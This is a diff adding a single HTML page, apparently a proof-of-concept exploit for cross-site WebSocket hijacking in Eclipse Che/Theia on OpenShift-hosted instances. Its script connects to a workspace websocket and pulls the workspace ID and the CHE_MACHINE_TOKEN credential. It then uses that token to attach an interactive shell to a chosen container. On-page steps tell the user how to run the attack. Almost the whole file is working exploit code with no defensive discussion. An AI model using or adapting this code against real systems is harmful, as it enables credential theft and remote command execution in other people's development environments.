@@ -1,0 +1,276 @@
+<html>
+<head>
+	<!-- title, skeleton.css etc.. -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css">
+	<style>
+		#header {
+			text-align: center;
+		}
+		#output {
+			border: 1px dashed #00000088;
+			width: 80%;
+			max-width: 700px;
+			height: 60vh;
+			max-height: 60vh;
+			margin: auto;
+			display: block;
+			overflow-x: hidden;
+			overflow-y: scroll;
+		}
+		#input {
+			width: 80%;
+			max-width: 700px;
+			margin: auto;
+			margin-top: 16px;
+			display: block;
+		}
+		pre {
+			white-space: pre-line;
+			word-break: break-all;
+			margin-top: 8px;
+    		margin-bottom: 0;
+    		margin-right: 16px;
+    		margin-left: 16px;
+		}
+	</style>
+</head>
+<body>
+	<h2 id="header">GCP CHE-CSWSH-POC</h2>
+
+	<div id="output">
+		<!-- generated -->
+	</div>
+	<input id="input" type="text" autofocus></input>
+
+	<script>
+	const SERVICE_WORKSPACE = 67;
+	const SERVICE_ENVIRONMENT = 47;
+	const READY = 'ready';
+	const CHANNELS = [
+		{"kind":"open","id":0,"path":"/services/commands"},
+	{"kind":"open","id":1,"path":"/services/logger"},
+	{"kind":"open","id":2,"path":"/services/messageService"},
+	{"kind":"open","id":3,"path":"/services/filesystem"},
+	{"kind":"open","id":4,"path":"/services/fs-watcher"},
+	{"kind":"open","id":5,"path":"/services/workspace"},
+	{"kind":"open","id":6,"path":"/services/envs"},
+	{"kind":"open","id":7,"path":"/services/application"},
+	{"kind":"open","id":8,"path":"/services/task"},
+	{"kind":"open","id":9,"path":"/services/quickPick"},
+	{"kind":"open","id":10,"path":"/services/shell-terminal"},
+	{"kind":"open","id":11,"path":"/services/debug"},
+	{"kind":"open","id":12,"path":"/services/git"},
+	{"kind":"open","id":13,"path":"/services/git-watcher"},
+	{"kind":"open","id":14,"path":"/services/mini-browser-service"},
+	{"kind":"open","id":15,"path":"/services/plugin-dev"},
+	{"kind":"open","id":16,"path":"/services/hostedPlugin"},
+	{"kind":"open","id":17,"path":"/services/plugin-ext"},
+	{"kind":"open","id":18,"path":"/services/plugin-paths"},
+	{"kind":"open","id":19,"path":"/services/search"},
+	{"kind":"open","id":20,"path":"/services/languages"},
+	{"kind":"open","id":21,"path":"/services/search-in-workspace"},
+	{"kind":"open","id":25,"path":"/services/terminals/25"},
+		{"kind":"open","id":SERVICE_WORKSPACE,"path":"/services/che-workspace-service"},
+		{"kind": 'open', "id": SERVICE_ENVIRONMENT, "path": "/services/envs"}
+	];
+
+	let server = {};
+	let handlers = {};
+	let id = 100;
+	wsAttach = false;
+
+	function send(message, callback) {
+		message.content.id = ++id;
+		message.content = JSON.stringify(message.content);
+
+		if (!message.kind) {
+			message.kind = 'data';
+		}
+
+		handlers[id] = callback;
+		message.jsonrpc = "2.0"
+		ws.send(JSON.stringify(message));
+	}
+
+	function getEnvironmentProperty(property) {
+		return {
+			"id": SERVICE_ENVIRONMENT,"content": {
+				method:"getValue",
+				"params": property
+			}
+		};
+	}
+
+	function getWorkspaceProperty(property) {
+		return {
+			"id": SERVICE_WORKSPACE,"content": {
+				method: property,
+				"params": null
+			}
+		};
+	}
+
+	function getContainerList(callback) {
+		send(getWorkspaceProperty('getContainerList'), (msg) => {
+			let containers = msg.result.map(server => server.name).join(', ');
+			output(`available containers [${containers}]\n\nUse "/attach <name>" to attach a terminal.`);
+			callback(msg.result);
+		});
+	}
+
+	function getTerminalServer(callback) {
+		send(getWorkspaceProperty('findTerminalServer'), (msg) => {
+			output(`terminal server url "${msg.result.url}"`);
+			callback(msg.result.url);
+		});
+	}
+
+	function getWorkspaceId(callback) {
+		send(getEnvironmentProperty("CHE_WORKSPACE_ID"), msg => {
+			output(`${msg.result.name}=${msg.result.value}`);
+			callback(msg.result.value);
+		});
+	}
+
+	function getMachineToken(callback) {
+		send(getEnvironmentProperty("CHE_MACHINE_TOKEN"), msg => {
+			output(`${msg.result.name}=${msg.result.value}`);
+			callback(msg.result.value);
+		});
+	}
+
+	function has(object, keys) {
+		let has = true;
+		for (let key of keys) {
+			has &= (key in object);
+		}
+		return has;
+	}
+
+	function connect(domain) {
+		window.ws = new WebSocket(`${domain}`);
+
+		ws.onmessage = (e) => {
+			let msg = JSON.parse(e.data);
+			if (msg.content) {
+				msg = JSON.parse(msg.content);
+				if (msg.params) {
+					msg = msg.params;
+				}
+			}
+			output(JSON.stringify(msg));
+
+			handlers[SERVICE_ENVIRONMENT] = (msg) => {
+				if (msg.kind == READY) {
+					getWorkspaceId(id => server["workspaceId"] = id);
+					getTerminalServer(url => server["url"] = url);
+					getContainerList(list => server["containers"] = list);
+					getMachineToken(token => server["token"] = token);
+				}
+			}
+
+			if (handlers[msg.id]) {
+				handlers[msg.id](msg);
+			}
+		};
+		ws.onerror = (e) => {output(`Failed to connect to ${domain}, make sure che is available.`)};
+		ws.onopen = () => {
+			for (let channel of CHANNELS) {
+				ws.send(JSON.stringify(channel));
+			}
+		};
+	}
+
+	function attach(server) {
+		if (has(server, ['workspaceId', 'url', 'container', 'token'])) {
+			let connectUrl = `${server.url}/connect?token=${server.token}`;
+			output(`attaching to container ${server.container} on terminal server "${server.url}"..`);
+	 		let wsConnect = new WebSocket(connectUrl);
+
+			wsConnect.onopen = () => {
+				wsConnect.send(JSON.stringify({
+						jsonrpc:"2.0",
+						id: 0,
+						method:"create",
+						params: {
+							identifier: {
+								machineName: server.container,
+								workspaceId: server.workspaceId
+							},
+							cmd:[],
+							cwd:"file:///projects",
+							cols:107,
+							rows:25,
+							tty:true
+						}
+					})
+				);
+			}
+			wsConnect.onmessage = (e) => {
+				output(e.data);
+				let msg = JSON.parse(e.data);
+
+				if (msg.result) {
+					let attachUrl = `${server.url}/attach/${msg.result}?token=${server.token}`;
+					window.wsAttach = new WebSocket(attachUrl);
+
+					wsAttach.onopen = () => {
+						output(`terminal attached successfully.`);
+					};
+					wsAttach.onmessage = (e) => {
+						output(e.data)
+					};	
+					init = true;
+				}
+			};
+		} else {
+			output(`failed to attach, make sure to connect first. ${JSON.stringify(server)}`);
+		}
+	}
+
+	function output(text) {
+		let output = document.getElementById('output');
+		let line = document.createElement('pre');
+		line.innerHTML = text.replace(/\u001b\[.*?(m|6n)/g, '');
+		output.appendChild(line);
+		output.scrollTop = output.scrollHeight;
+	}
+
+	let con = document.getElementById("input");
+
+	con.addEventListener('keypress', (e) => {
+		if (e.key == 'Enter') {
+			let input = con.value.split(' ');
+			switch (input[0]) {
+				case "/connect": {
+					output(`connecting to ${input[1]}..`);
+					delete server.container; // reset container selection.
+					connect(input[1]);
+				}
+				break;
+				case "/attach": {
+					output(`attaching to ${input[1]}..`);
+					server.container = input[1];
+					attach(server);
+				}
+				break;
+				default: {
+					if (wsAttach) {
+						wsAttach.send(`${con.value}\n`);
+					} else {
+						output('not connected, please /connect and /attach first.');
+					}
+				}
+			}
+			con.value = '';
+		}
+	});
+	con.focus();
+
+	output(`1) login to a CHE instance on https://che.openshift.io/ and note the domain of the websocket.\n
+		    2) type "/connect [domain]" to exploit cross-site WebSocket hijacking in Theia.\n
+			3) type "/attach [container]" to attach the shell of the given container.\n`);
+	output(`example domain format routecoobb1ln-codingchili-che.b542.starter-us-east-2a.openshiftapps.com`);
+	</script>
+</body>
+</html>
